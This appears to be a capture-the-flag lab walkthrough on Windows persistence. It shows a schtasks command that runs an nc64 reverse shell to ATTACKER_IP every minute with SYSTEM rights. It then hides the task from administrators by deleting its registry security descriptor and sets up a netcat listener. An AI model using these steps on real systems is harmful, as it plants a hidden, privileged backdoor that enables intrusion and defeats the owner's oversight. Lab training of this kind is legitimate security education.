# Abusing Scheduled Tasks for Persistence

Scheduled tasks can be used to establish persistence on Windows systems. Below are some methods to schedule the execution of a payload.

## Task Scheduler

The most common way to schedule tasks is by using the built-in Windows Task Scheduler. It provides granular control over task execution, allowing tasks to start at specific times, repeat periodically, or trigger based on system events. You can interact with the Task Scheduler via the command line using `schtasks`. A complete reference for the command can be found on Microsoft's website.

### Creating a Scheduled Task

To create a task that runs a reverse shell every minute (for demonstration purposes), use the following command:

```cmd
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

> **Note:** Use `THM-TaskBackdoor` as the task name to ensure you get the flag.

This command creates a task named `THM-TaskBackdoor` that executes an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options specify the task's schedule (every minute), and `/ru SYSTEM` ensures it runs with SYSTEM privileges.

### Verifying the Task

To confirm the task was created successfully, run:

```cmd
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

## Making the Task Invisible

By default, the task is visible to users, which could raise suspicion. To hide it, you can delete its Security Descriptor (SD). The SD is an ACL that defines which users can access the task. Removing it prevents all users, including administrators, from seeing the task.

### Deleting the Security Descriptor

The SDs for scheduled tasks are stored in the registry under:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Each task has a corresponding registry key with an `SD` value. To delete the `SD` value for the `THM-TaskBackdoor` task, follow these steps:

1. Use `PsExec` to open Regedit with SYSTEM privileges:
    ```cmd
    C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
    ```

2. Navigate to the registry key for `THM-TaskBackdoor` and delete the `SD` value.

### Verifying the Task is Hidden

After deleting the `SD` value, querying the task will result in an error:

```cmd
C:\> schtasks /query /tn thm-taskbackdoor
ERROR: The system cannot find the file specified.
```

## Testing the Reverse Shell

Start an `nc` listener on the attacker's machine:

```bash
user@AttackBox$ nc -lvp 4449
```

After a minute, the reverse shell should connect back to the attacker's machine.

### Retrieving the Flag

Use the reverse shell to execute the following command and retrieve the flag:

```cmd
C:\> C:\flags\flag9.exe
```